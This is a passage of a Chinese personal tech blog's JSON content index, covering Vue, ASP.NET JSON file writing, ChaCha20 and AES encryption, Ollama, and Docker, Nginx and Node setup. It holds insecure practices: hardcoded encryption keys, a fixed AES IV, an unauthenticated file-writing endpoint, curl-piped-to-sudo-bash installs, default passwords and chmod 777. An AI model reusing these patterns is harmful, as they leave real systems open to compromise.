点击图片时触发，打开图片查看器function handleImageClick(imageUrl) &#123; urlList.value = [imageUrl]; // 设置图片 URL 列表 dialogVisible.value = true; // 打开对话框&#125;// 关闭对话框function closeDialog() &#123; dialogVisible.value = false; // 关闭对话框&#125;&lt;/script&gt; 也可以使用 el-image 简单展示&lt;!-- 大图展示 --&gt; &lt;el-dialog :visible.sync=&quot;dialogVisible&quot; width=&quot;50%&quot; center @close=&quot;closeDialog&quot; append-to-body&gt; &lt;el-image :src=&quot;currentImage&quot; style=&quot;width: 100%;&quot; /&gt; &lt;/el-dialog&gt; 取消播放结束关闭 @ended&#x3D;”handleDialogClose”","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://banjinmei.github.io/tags/vue/"}],"author":"mu"},{"title":".net write wwwroot json","slug":"net-write-wwwroot-json","date":"2024-10-15T17:24:24.000Z","updated":"2024-10-15T17:27:41.002Z","comments":true,"path":"2024/10/16/net-write-wwwroot-json/","permalink":"https://banjinmei.github.io/2024/10/16/net-write-wwwroot-json/","excerpt":"","text":"1. 创建一个新的控制器在Controllers文件夹中创建一个新控制器，例如JsonController.cs。 1234567891011121314151617181920212223242526272829303132333435363738394041using Microsoft.AspNetCore.Mvc;using System.IO;using Newtonsoft.Json;namespace Namespace.Controllers&#123; [ApiController] [Route(&quot;[controller]&quot;)] public class JsonController : ControllerBase &#123; private readonly string _jsonFilePath = Path.Combine(Directory.GetCurrentDirectory(), &quot;wwwroot&quot;, &quot;data.json&quot;); // GET: /json [HttpGet] public IActionResult GetJson() &#123; if (!System.IO.File.Exists(_jsonFilePath)) return NotFound(&quot;JSON file not found.&quot;); var jsonContent = System.IO.File.ReadAllText(_jsonFilePath); return Content(jsonContent, &quot;application/json&quot;); &#125; // POST: /json [HttpPost] public IActionResult PostJson([FromBody] DataType data) &#123; var jsonString = JsonConvert.SerializeObject(data); System.IO.File.WriteAllText(_jsonFilePath, jsonString); return Ok(&quot;JSON file updated successfully.&quot;); &#125; &#125; public class DataType &#123; // Define JSON structure here public string Name &#123; get; set; &#125; public int Age &#123; get; set; &#125; &#125;&#125; 2. 添加依赖项 package确保已经安装了Newtonsoft.Json包 123dotnet add package Newtonsoft.Json 3.配置文件路径在上述代码中，我们将JSON文件的路径设置为wwwroot&#x2F;data.json 4. 运行项目启动ASP.NET Core应用程序，并使用工具如Postman或浏览器测试API端点。 GET请求：http://localhost:5000/json POST请求：使用类似以下的JSON数据发送一个POST请求到http://localhost:5000/json： 12345&#123; &quot;name&quot;: &quot;lll&quot;, &quot;age&quot;: 30&#125; DataType class也可以嵌套多层 根据实际应用来编写","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"json","slug":"json","permalink":"https://banjinmei.github.io/tags/json/"}],"author":"mu"},{"title":".net chacha20 decrypted","slug":"net-chacha20-decrypted","date":"2024-10-15T17:10:02.000Z","updated":"2024-10-15T17:18:44.673Z","comments":true,"path":"2024/10/16/net-chacha20-decrypted/","permalink":"https://banjinmei.github.io/2024/10/16/net-chacha20-decrypted/","excerpt":"","text":".NET 实现 ChaCha20 加密和解密 add package1Install-Package BouncyCastle chacha20 helper123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051using Org.BouncyCastle.Crypto;using Org.BouncyCastle.Crypto.Engines;using Org.BouncyCastle.Crypto.Parameters;using System;public class ChaCha20&#123; private readonly byte[] key; private readonly byte[] nonce; // Constructor to initialize key and nonce public ChaCha20(byte[] key, byte[] nonce) &#123; if (key.Length != 32) &#123; throw new ArgumentException(&quot;Key must be 32 bytes (256 bits).&quot;); &#125; if (nonce.Length != 12) &#123; throw new ArgumentException(&quot;Nonce must be 12 bytes (96 bits).&quot;); &#125; this.key = key; this.nonce = nonce; &#125; // Method to encrypt the data using ChaCha20 public byte[] Encrypt(byte[] data, int offset, int count) &#123; return ProcessData(true, data, offset, count); &#125; // Method to decrypt the data using ChaCha20 public byte[] Decrypt(byte[] data, int offset, int count) &#123; return ProcessData(false, data, offset, count); &#125; // Helper method to process encryption/decryption private byte[] ProcessData(bool forEncryption, byte[] data, int offset, int count) &#123; var engine = new ChaCha7539Engine(); // ChaCha20/Poly1305 engine (ChaCha7539) var parameters = new ParametersWithIV(new KeyParameter(key), nonce); engine.Init(forEncryption, parameters); byte[] output = new byte[count]; engine.ProcessBytes(data, offset, count, output, 0); return output; &#125;&#125; 关键点解释：ChaCha7539Engine: BouncyCastle 提供了 ChaCha7539Engine，这是 ChaCha20 加密算法的实现（96-bit nonce，32-byte key）。ProcessData: ProcessData 方法负责执行加密和解密，取决于传入的 forEncryption 参数。加密时，forEncryption 为 true，否则为 false。Key 和 Nonce: ChaCha20 使用 32 字节（256 位）的密钥和 12 字节（96 位）的 nonce。如果传入的密钥或 nonce 不符合长度要求，会抛出 ArgumentException。Encrypt 和 Decrypt: Encrypt 和 Decrypt 调用 ProcessData 来执行加解密，分别用于加密和解密数据。调用示例： 12345678910111213141516171819202122232425public class Program&#123; public static void Main() &#123; // 示例密钥和 nonce byte[] key = new byte[32] &#123; 0x1E, 0x12, 0x0B, 0x02, 0x05, 0x18, 0x01, 0x13, 0x10, 0x0D, 0x04, 0x06, 0x07, 0x19, 0x09, 0x15, 0x0F, 0x17, 0x08, 0x00, 0x1A, 0x16, 0x1D, 0x14, 0x0E, 0x03, 0x1B, 0x1C, 0x11, 0x0C, 0x1E, 0x1F &#125;; byte[] nonce = new byte[12] &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B &#125;; // 要加密的示例数据 byte[] plainText = System.Text.Encoding.UTF8.GetBytes(&quot;Hello, ChaCha20 encryption!&quot;); // 加密 ChaCha20 chacha20 = new ChaCha20(key, nonce); byte[] cipherText = chacha20.Encrypt(plainText, 0, plainText.Length); Console.WriteLine(&quot;Encrypted: &quot; + BitConverter.ToString(cipherText)); // 解密 byte[] decryptedText = chacha20.Decrypt(cipherText, 0, cipherText.Length); Console.WriteLine(&quot;Decrypted: &quot; + System.Text.Encoding.UTF8.GetString(decryptedText)); &#125;&#125; 输出： 12Encrypted: &lt;加密的十六进制字节串&gt;Decrypted: Hello, ChaCha20 encryption! 通过CHACHA2加解密文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102public class FileEncryptorHelper&#123; // 生成随机的 Nonce（12字节） private byte[] GenerateRandomNonce() &#123; byte[] nonce = new byte[12]; // 12字节的Nonce using (var rng = RandomNumberGenerator.Create()) &#123; rng.GetBytes(nonce); &#125; return nonce; &#125; // 生成固定的 Key（32字节） private byte[] GenerateKey() &#123; // 使用固定的 256 位（32 字节）的密钥 return new byte[] &#123; 0x1E, 0x12, 0x0B, 0x02, 0x05, 0x18, 0x01, 0x13, 0x10, 0x0D, 0x04, 0x06, 0x07, 0x19, 0x09, 0x15, 0x0F, 0x17, 0x08, 0x00, 0x1A, 0x16, 0x1D, 0x14, 0x0E, 0x03, 0x1B, 0x1C, 0x11, 0x0C, 0x1E, 0x1F &#125;; &#125; // 加密文件 每4096 public void EncryptFile(string inputPath, string outputPath, int blockSize = 4096) &#123; byte[] nonce = GenerateRandomNonce(); byte[] key = GenerateKey(); EncryptFile(inputPath, outputPath, key, nonce, blockSize); &#125; // 使用随机生成的 Nonce 和固定的 Key 进行 ChaCha20 加密 public void EncryptFile(string inputPath, string outputPath, byte[] key, byte[] nonce, int blockSize) &#123; if (!File.Exists(outputPath)) &#123; File.Create(outputPath).Dispose(); &#125; using (var inputFile = File.OpenRead(inputPath)) using (var outputFile = File.OpenWrite(outputPath)) &#123; // 将 nonce 写入输出文件的开头 outputFile.Write(nonce, 0, nonce.Length); using (var chacha20 = new MyCC20(key, nonce)) &#123; byte[] buffer = new byte[blockSize]; int bytesRead; // 逐块读取文件内容并加密 while ((bytesRead = inputFile.Read(buffer, 0, blockSize)) &gt; 0) &#123; byte[] encryptedData = chacha20.EncryptBytes(buffer, bytesRead); outputFile.Write(encryptedData, 0, encryptedData.Length); &#125; &#125; &#125; Console.WriteLine(&quot;File encrypted successfully: &quot; + outputPath); &#125; // 解密文件 public void DecryptFile(string inputPath, string outputPath, int blockSize = 4096) &#123; if (!File.Exists(outputPath)) &#123; File.Create(outputPath).Dispose(); &#125; using (var inputFile = File.OpenRead(inputPath)) using (var outputFile = File.OpenWrite(outputPath)) &#123; // 从输入文件的开头读取 nonce byte[] nonce = new byte[12]; int nonceRead = inputFile.Read(nonce, 0, nonce.Length); if (nonceRead != 12) throw new Exception(&quot;Invalid nonce&quot;); byte[] key = GenerateKey(); using (var chacha20 = new MyCC20(key, nonce)) &#123; byte[] buffer = new byte[blockSize]; int bytesRead; // 逐块读取文件内容并解密 while ((bytesRead = inputFile.Read(buffer, 0, blockSize)) &gt; 0) &#123; byte[] decryptedData = chacha20.DecryptBytes(buffer, bytesRead); outputFile.Write(decryptedData, 0, decryptedData.Length); &#125; &#125; &#125; Console.WriteLine(&quot;File decrypted successfully: &quot; + outputPath); &#125;&#125; 调用 1234567891011121314151617try&#123; // 创建 FileEncryptorHelper 对象 FileEncryptorHelper fileEncryptor = new FileEncryptorHelper(); // 指定加密文件路径和解密后的输出文件路径 string encryptedFilePath = &quot;13632AE2-354E-45B8-9BBA-D474005B5DBC.data&quot;; // 加密文件路径 &quot;http://8xxx4:8080/group1/110/13632AE2-354E-45B8-9BBA-D474005B5DBC.data&quot;;// string decryptedFilePath = &quot;decryptedFile3.png&quot;; // 解密后的文件路径 // 调用解密方法 fileEncryptor.DecryptFile(encryptedFilePath, decryptedFilePath); Console.WriteLine(&quot;文件解密成功！&quot;);&#125;catch (Exception ex)&#123; Console.WriteLine(&quot;文件解密失败: &quot; + ex.Message);&#125; 输出 1234&#123;&quot;5&quot;:&quot;\\/group1\\/110\\/13632AE2-354E-45B8-9BBA-D474005B5DBC.data&quot;&#125;Str5 : /group1/110/13632AE2-354E-45B8-9BBA-D474005B5DBC.dataFile decrypted successfully: decryptedFile3.png文件解密成功！ 同理解密音频文件 1234xxx93EC685A2D41.dataFile decrypted successfully: decryptedFileaac.aac文件解密成功！ mp4视频同理","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"chacha20","slug":"chacha20","permalink":"https://banjinmei.github.io/tags/chacha20/"}],"author":"mu"},{"title":".net local LLM","slug":"net-local-LLM","date":"2024-10-15T16:11:42.000Z","updated":"2024-10-15T16:42:19.011Z","comments":true,"path":"2024/10/16/net-local-LLM/","permalink":"https://banjinmei.github.io/2024/10/16/net-local-LLM/","excerpt":"","text":"ollama1ollama --version 比较常用的指令不多，也很简单列出本地下载的模型 1ollama list 查看正在运行的模型 1ollama ps 模型标识下载模型到本地 1ollama pull 比如我要下载llama2-chinese:7b则使用 1ollama pull llama2-chinese:7b 模型标识运行模型，如果已下载则直接运行，如果没下载则先下载再运行。 1ollama run 比如我要运行llama2-chinese:7b可以直接运行 1ollama run llama2-chinese:7b .net package1dotnet add package Ollama --version 1.9.0 1234567891011121314151617181920212223//模型名称是必须要传递的，默认 流式输出,如果想一次返回同样的是设置stream为false。 string modelName = &quot;llama2-chinese:7b&quot;; using var ollama = new OllamaApiClient(baseUri: new Uri(&quot;http://127.0.0.1:11434/api&quot;)); Console.WriteLine(&quot;begin~~~&quot;); string userInput = &quot;&quot;; do &#123; Console.WriteLine(&quot;User:&quot;); userInput = Console.ReadLine()!; var enumerable = ollama.Completions.GenerateCompletionAsync(modelName, userInput); Console.WriteLine(&quot;Agent:&quot;); await foreach (var response in enumerable) &#123; Console.Write($&quot;&#123;response.Response&#125;&quot;); &#125; Console.WriteLine(); &#125; while (!string.Equals(userInput, &quot;exit&quot;, StringComparison.OrdinalIgnoreCase)); Console.WriteLine(&quot;end~~~&quot;);","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"LLM","slug":"LLM","permalink":"https://banjinmei.github.io/tags/LLM/"},{"name":"ollama","slug":"ollama","permalink":"https://banjinmei.github.io/tags/ollama/"}],"author":"mu"},{"title":"debian docker gitlab gitea","slug":"debian-docker-gitlab-gitea","date":"2024-10-15T15:57:02.000Z","updated":"2024-11-03T17:45:42.784Z","comments":true,"path":"2024/10/15/debian-docker-gitlab-gitea/","permalink":"https://banjinmei.github.io/2024/10/15/debian-docker-gitlab-gitea/","excerpt":"","text":"使用docker部署私有化代码管理~ docker12curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 国内docker更新系统包索引 1sudo apt update 安装一些必要的包，以便于后续添加 apt 仓库： 1sudo apt install -y apt-transport-https ca-certificates curl gnupg2 software-properties-common 添加阿里云密钥添加 GPG 密钥是为了确保软件包的安全性和完整性，避免安装过程中的潜在问题。建议尽量执行这一步，以确保安装过程顺利进行。 1curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/debian/gpg | sudo apt-key add - 设置阿里云docker仓库 1sudo add-apt-repository &quot;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/debian $(lsb_release -cs) stable&quot; 再次更新下系统包的索引 1sudo apt update 安装docker 1sudo apt install -y docker-ce 启动并设置docker的开机自启动 12sudo systemctl start dockersudo systemctl enable docker 查看下docker是否安装成功 1sudo docker version 最后配置docker的镜像加速推荐阿里云的网址https://cr.console.aliyun.com/us-west-1/instances/mirrors gitlab123456docker run --name &quot;my-gitlab&quot; \\ --hostname &quot;my-gitlab&quot; \\ -p 80:80 \\ --restart unless-stopped \\ -d gitlab/gitlab-ce:latest 默认用户名: root默认密码: 5iveL!fe 12345docker exec -it my-gitlab bashcat /etc/gitlab/initial_root_passwordPassword: 5iveL!fe 修改默认密码首次登录 GitLab 后，建议立即更改默认密码。可以通过以下步骤进行： 登录 GitLab Web 界面，使用 root 作为用户名和默认密码。登录后，点击右上角的头像，选择 Settings。在 User Settings 页面，选择 Password。输入当前密码和新密码，然后点击 Save password。通过这些步骤，你可以安全地管理 GitLab 的默认账号和密码，确保系统的安全性和稳定性。 用户名：m密码：xxx URL:http://xxx:9090/ git命令 12345678910111213# input user pwd git clone http://xxx/dev/xx.git git config –global user.emailgit config –global user.name #添加到暂存区git add .#推送，提交更改git commit -m “这是一个测试文件”#推送更改到gitlabgit push Gitea 123456docker pull gitea/gitea:latestmkdir -p /var/lib/giteadocker run -d --name=gitea -p 10022:22 -p 80:3000 -v /var/lib/gitea:/data gitea/gitea:latest 访问80 完成初始化 初始化完即可使用","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"gitea","slug":"gitea","permalink":"https://banjinmei.github.io/tags/gitea/"},{"name":"gitlab","slug":"gitlab","permalink":"https://banjinmei.github.io/tags/gitlab/"}],"author":"mu"},{"title":"nginx domain 4 nodeserver","slug":"nginx-domain-4-nodeserver","date":"2024-10-09T12:36:34.000Z","updated":"2025-01-01T15:58:31.638Z","comments":true,"path":"2024/10/09/nginx-domain-4-nodeserver/","permalink":"https://banjinmei.github.io/2024/10/09/nginx-domain-4-nodeserver/","excerpt":"","text":"安装了 Nginx1234sudo apt updatesudo apt install nginx node1234curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -sudo apt-get install -y nodejsnode -vnpm -v 12345678910111213141516//testwebside const http = require(&#x27;http&#x27;); const hostname = &#x27;0.0.0.0&#x27;; //127001const port = 8080; const server = http.createServer((req, res) =&gt; &#123; res.statusCode = 200; res.setHeader(&#x27;Content-Type&#x27;, &#x27;text/plain&#x27;); res.end(&#x27;Hello World 8080 \\n&#x27;);&#125;); server.listen(port, hostname, () =&gt; &#123; console.log(`Server running at http://$&#123;hostname&#125;:$&#123;port&#125;/`);&#125;); 9090const port &#x3D; 9090; 123456pm2 nodenpm install pm2 -gnohup node n80.js &gt; n80.log 2&gt;&amp;1 &amp;nohup node n90.js &gt; n90.log 2&gt;&amp;1 &amp; 或 pm2 配置 Node.js 应用假设你有两个 Node.js 应用，分别监听在端口 8080（n80.js） 和 9090（n90.js）。 确保 Node.js 应用已经启动并分别监听这两个端口。你可以用 pm2 或 forever 来管理 Node.js 应用的启动。 例如，使用 pm2 启动应用： 12pm2 start n80.js --name n80-apppm2 start n90.js --name n90-app Nginx 配置编辑或创建你自己的 Nginx 配置文件，通常在 &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F; 下。 配置示例：你需要为两个不同的域名（或子域名）配置两个 server 块。 1sudo nano /etc/nginx/sites-available/my-apps Nginx 配置文件： 配置第一个域名 w1.xxx.com 绑定到端口 8080123456789101112server &#123; listen 80; server_name w1.xxx.com; location / &#123; proxy_pass http://127.0.0.1:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125;&#125; 配置第二个域名 w2.xxx.com 绑定到端口 9090123456789101112server &#123; listen 80; server_name w2.xxx.com; location / &#123; proxy_pass http://127.0.0.1:9090; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125;&#125; 这个配置文件将使 w1.xxx.com 指向第一个应用（监听端口 8080 的 n80.js），而 w2.xxx.com 指向第二个应用（监听端口 9090 的 n90.js）。 启用 Nginx 配置将配置文件链接到 sites-enabled 目录并重启 Nginx： 1234sudo ln -s /etc/nginx/sites-available/my-apps /etc/nginx/sites-enabled/sudo nginx -t # 测试配置文件是否正确sudo systemctl restart nginx # 重启 Nginx DNS 配置 &#x2F; 域名解析确保你已经将 w1.xxx.com 和 w2.xxx.com 的 DNS 配置指向服务器的 IP 地址。 测试 访问 w1.xxx.com &#x3D;&#x3D; n80.js Hello World 8080 而访问w2.xxx.com &#x3D;&#x3D; n90.js。 Hello World 9090 Nginx 日志： 12tail -f /var/log/nginx/error.log","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"nginx","slug":"nginx","permalink":"https://banjinmei.github.io/tags/nginx/"}],"author":"mu"},{"title":".NET build release 4 linux","slug":"NET-build-release-4-linux","date":"2024-09-29T03:52:15.000Z","updated":"2024-11-10T13:08:36.384Z","comments":true,"path":"2024/09/29/NET-build-release-4-linux/","permalink":"https://banjinmei.github.io/2024/09/29/NET-build-release-4-linux/","excerpt":"","text":"在项目中使用 dotnet publish 命令来发布应用程序。 将发布的应用程序文件夹复制到 Linux 服务器上。 在 Linux 服务器上安装 .NET 运行时，如果应用是 self-contained（独立部署）的。 使用 systemd 创建一个服务单元文件来管理应用作为服务运行。 启动应用程序服务。 发布应用程序： 1dotnet publish -c Release -o ./publish 将发布文件夹复制到 Linux 服务器： 1scp -r ./publish [user]@[host]:/var/www/myapp 运行 1dotnet myapp.dll 创建 systemd 服务文件 &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;myapp.service： 1234567891011121314[Unit]Description=My .NET App [Service]WorkingDirectory=/var/www/myappExecStart=/var/www/myapp/MyAppRestart=alwaysRestartSec=10SyslogIdentifier=dotnet-myappUser=www-dataEnvironment=ASPNETCORE_ENVIRONMENT=Production [Install]WantedBy=multi-user.target 启动服务： 123sudo systemctl enable myapp.servicesudo systemctl start myapp.service 确保应用程序配置了正确的端口监听和防火墙规则。 api wr wwwroot json 123456789101112131415161718192021222324252627282930313233343536373839404142using Microsoft.AspNetCore.Mvc;using System.IO;using Newtonsoft.Json;namespace MNamespace.Controllers&#123; [ApiController] [Route(&quot;[controller]&quot;)] public class JsonController : ControllerBase &#123; //wwwroot/data.json private readonly string _jsonFilePath = Path.Combine(Directory.GetCurrentDirectory(), &quot;wwwroot&quot;, &quot;data.json&quot;); // GET: /json [HttpGet] public IActionResult GetJson() &#123; if (!System.IO.File.Exists(_jsonFilePath)) return NotFound(&quot;JSON file not found.&quot;); var jsonContent = System.IO.File.ReadAllText(_jsonFilePath); return Content(jsonContent, &quot;application/json&quot;); &#125; // POST: /json [HttpPost] public IActionResult PostJson([FromBody] MDataType data) &#123; var jsonString = JsonConvert.SerializeObject(data); System.IO.File.WriteAllText(_jsonFilePath, jsonString); return Ok(&quot;JSON file updated successfully.&quot;); &#125; &#125; public class MDataType &#123; // Define M JSON structure here public string Name &#123; get; set; &#125; public int Age &#123; get; set; &#125; &#125;&#125; Newtonsoft.Json GET请求：http://localhost:5000/json POST请求：使用类似以下的JSON数据发送一个POST请求到http://localhost:5000/json： 12345Copy Code&#123; &quot;name&quot;: &quot;m&quot;, &quot;age&quot;: 30&#125; 写入 123456789101112131415161718192021222324252627282930313233343536373839404142 using Microsoft.AspNetCore.Mvc;using System.IO;using Newtonsoft.Json;namespace MNamespace.Controllers&#123; [ApiController] [Route(&quot;[controller]&quot;)] public class JsonController : ControllerBase &#123; private readonly string _jsonFilePath = Path.Combine(Directory.GetCurrentDirectory(), &quot;wwwroot&quot;, &quot;data.json&quot;); // GET: /json [HttpGet] public IActionResult GetJson() &#123; if (!System.IO.File.Exists(_jsonFilePath)) return NotFound(&quot;JSON file not found.&quot;); var jsonContent = System.IO.File.ReadAllText(_jsonFilePath); return Content(jsonContent, &quot;application/json&quot;); &#125; // POST: /json [HttpPost] public IActionResult PostJson([FromBody] MDataType data) &#123; var jsonString = JsonConvert.SerializeObject(data); System.IO.File.WriteAllText(_jsonFilePath, jsonString); return Ok(&quot;JSON file updated successfully.&quot;); &#125; &#125; public class MDataType &#123; // Define M JSON structure here public string Name &#123; get; set; &#125; public int Age &#123; get; set; &#125; &#125;&#125; 发布所有 dotnet publish -c Release -o .&#x2F;publish MySolution&#x2F;│├── MyProjectA&#x2F;│ └── MyProjectA.csproj├── MyProjectB&#x2F;│ └── MyProjectB.csproj└── MySolution.sln如果想只发布 MyProjectA 而不是整个解决方案，可以导航到 MyProjectA 的目录下执行 dotnet publish 命令，或者从解决方案的根目录直接指定项目的路径。以下是两种方法： 方法一：在项目目录中执行命令12cd MySolution/MyProjectAdotnet publish -c Release -o ../../publish 方法二：从解决方案根目录指定项目路径12cd MySolutiondotnet publish ./MyProjectA/MyProjectA.csproj -c Release -o ./publish 排除特定项目dotnet publish 命令本身没有直接支持排除特定项目的选项。但是，可以通过仅指定要发布的项目来间接实现这一点。如果需要同时发布多个项目，可以为每个项目单独运行 dotnet publish 命令。 例如，如果想发布 MyProjectA 和 MyProjectB，但不发布其他任何项目，可以这样做： 12dotnet publish ./MyProjectA/MyProjectA.csproj -c Release -o ./publishdotnet publish ./MyProjectB/MyProjectB.csproj -c Release -o ./publish 这样，只有 MyProjectA 和 MyProjectB 被发布到了 .&#x2F;publish 目录中，而其他项目则被忽略。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"}],"author":"mu"},{"title":"Err idealTree:npm: sill idealTree ","slug":"Err-idealTree-npm-sill-idealTree","date":"2024-09-21T17:18:16.000Z","updated":"2024-09-21T17:20:05.173Z","comments":true,"path":"2024/09/22/Err-idealTree-npm-sill-idealTree/","permalink":"https://banjinmei.github.io/2024/09/22/Err-idealTree-npm-sill-idealTree/","excerpt":"","text":"idealTree:npm: sill idealTree buildDeps Err #清除缓存 1npm cache clean --force 出现npm WARN using –force I sure hope you know what you are doing.用： 1npm cache verify 设置镜像源：1npm config set registry https://registry.npmmirror.com 查看下是否设置成功：1npm config get registry https://registry.npmmirror.com 1npm install","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"npm","slug":"npm","permalink":"https://banjinmei.github.io/tags/npm/"}],"author":"mu"},{"title":"mac recover","slug":"mac-recover","date":"2024-09-20T17:37:04.000Z","updated":"2024-09-20T17:40:15.219Z","comments":true,"path":"2024/09/21/mac-recover/","permalink":"https://banjinmei.github.io/2024/09/21/mac-recover%EE%9B%AA/","excerpt":"","text":"mac book 恢复出厂设置-左上角系统偏好设置-抹除所有内容 reboot1.关闭电脑，按下组合键(option+command+R或command+R)，然后按电源键开机，直到出现苹果logo以及进度条即可松手，启动macOS实用工具； 2.出现macOS实用工具对话框后，选择磁盘工具，点击继续按钮； 3.选择左侧内置主硬盘抹掉，可以重命名为Macintosh HD； 4.关闭对话框，返回实用工具页面，选择重新安装macOS(如果出现问题不用担心，长按关机键强制关机后，按cmd+R重新进入选择安装即可)； 5.重新安装时，建议检查右上角的Wi-Fi是否连接，之后按照提示操作即可。 win share file访达-&gt;连接到服务器 smb:192.168.X.X http://www.dnpz.net/diannaozhishi/5252.html win mac文件传输 参考https://support.apple.com/zh-cn/102664 抹掉 Machttps://support.apple.com/zh-cn/102522 command+r -&gt; 实用工具 设置完整安全性 MAC CPU1、打开「访达」&gt;「应用程序」&gt;「实用工具」&gt;「活动监视器」。 2、点击「CPU」选项卡，然后点击「%CPU」列，对进程进行排序。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"mac","slug":"mac","permalink":"https://banjinmei.github.io/tags/mac/"},{"name":"recover","slug":"recover","permalink":"https://banjinmei.github.io/tags/recover/"}],"author":"mu"},{"title":"docker oracle","slug":"docker-oracle","date":"2024-09-20T17:27:39.000Z","updated":"2024-09-20T17:30:27.646Z","comments":true,"path":"2024/09/21/docker-oracle/","permalink":"https://banjinmei.github.io/2024/09/21/docker-oracle/","excerpt":"","text":"使用Docker容器安装Oracle数据库 安装Docker12sudo apt-get updatesudo apt-get install docker.io 下载镜像1docker pull registry.cn-hangzhou.aliyuncs.com/zhuyijun/oracle:19c 创建文件1mkdir -p /home/data/oracle/oradata 授权，不授权会导致后面安装失败123456789101112chmod 777 /home/data/oracle/oradatadocker run -d -p 1521:1521 -p 5500:5500 -e ORACLE_SID=ORCLCDB -e ORACLE_PDB=ORCLPDB -e ORACLE_PWD=123456 -e ORACLE_EDITION=standard -e ORACLE_CHARACTERSET=AL32UTF8 -v /home/data/oracle/oradata:/opt/oracle/oradata --name oracle registry.cn-hangzhou.aliyuncs.com/zhuyijun/oracle:19c 进入 1docker exec -it oracle-db bash -c &quot;source /home/oracle/.bashrc; sqlplus /nolog&quot; 12345SQL&gt; CONNECT sys as sysdba@your_passwordSQL&gt; ALTER USER sys IDENTIFIED BY your_password;SQL&gt; CREATE USER your_username IDENTIFIED BY your_password;SQL&gt; GRANT CONNECT, RESOURCE TO your_username; 12345678910CREATE TABLE test_table ( id NUMBER, name VARCHAR2(50));INSERT INTO test_table (id, name) VALUES (1, &#x27;Test Name&#x27;);COMMIT;SELECT * FROM test_table; 12CONNECT / AS SYSDBA; 以 SYSDBA 角色连接到数据库。 使用 SYSDBA 角色登录，该角色具有最高级别的数据库权限，允许进行系统级别的管理任务。 1alter user system identified by 密码;修改系统用户（system）的登录密码。 1CREATE USER hhhhh IDENTIFIED BY 密码; 创建一个新用户 hhhhh，并指定其登录密码。 1GRANT CREATE SESSION TO hhhhh; 允许用户 hhhhh连接到数据库。 1GRANT CREATE TABLE TO hhhhh; 允许用户 hhhhh在数据库中创建新的表。 1ALTER USER hhhhh QUOTA UNLIMITED ON USERS; 设置用户 hhhhh 在表空间 USERS 上的存储配额为无限制，允许用户存储数据","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"roacle","slug":"roacle","permalink":"https://banjinmei.github.io/tags/roacle/"}],"author":"mu"},{"title":"node ase encrypt","slug":"node-ase-encrypt","date":"2024-09-20T17:25:07.000Z","updated":"2024-09-20T17:26:46.952Z","comments":true,"path":"2024/09/21/node-ase-encrypt/","permalink":"https://banjinmei.github.io/2024/09/21/node-ase-encrypt/","excerpt":"","text":"1234567891011121314151617181920212223// 加密方法public static string Encrypt(string plainText, string key)&#123; using (Aes aesAlg = Aes.Create()) &#123; aesAlg.Key = Encoding.UTF8.GetBytes(key); aesAlg.IV = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6];// new byte[16]; // 初始化向量 (IV) 可以设为全零，也可以使用随机值 ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV); using (MemoryStream msEncrypt = new MemoryStream()) &#123; using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)) using (StreamWriter swEncrypt = new StreamWriter(csEncrypt)) &#123; swEncrypt.Write(plainText); &#125; return Convert.ToBase64String(msEncrypt.ToArray()); &#125; &#125;&#125; 12345678910111213141516// 加密方法function encrypt(plainText, key) &#123; const iv = Buffer.from([1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6]); // 